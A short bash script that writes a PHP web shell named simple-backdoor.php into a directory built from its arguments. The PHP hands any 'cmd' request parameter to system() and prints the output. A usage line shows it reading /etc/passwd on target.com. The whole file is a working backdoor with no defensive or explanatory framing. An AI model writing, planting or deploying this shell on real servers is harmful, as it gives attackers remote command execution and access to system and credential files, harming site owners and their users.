#!/bin/bash

file=simple-backdoor.php
parent_dir=php

touch $1/$2/$parent_dir/$file

cat << EOF >> $1/$2/$parent_dir/$file

<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset(\$_REQUEST['cmd'])){
        echo "<pre>";
        \$cmd = (\$_REQUEST['cmd']);
        system(\$cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->

EOF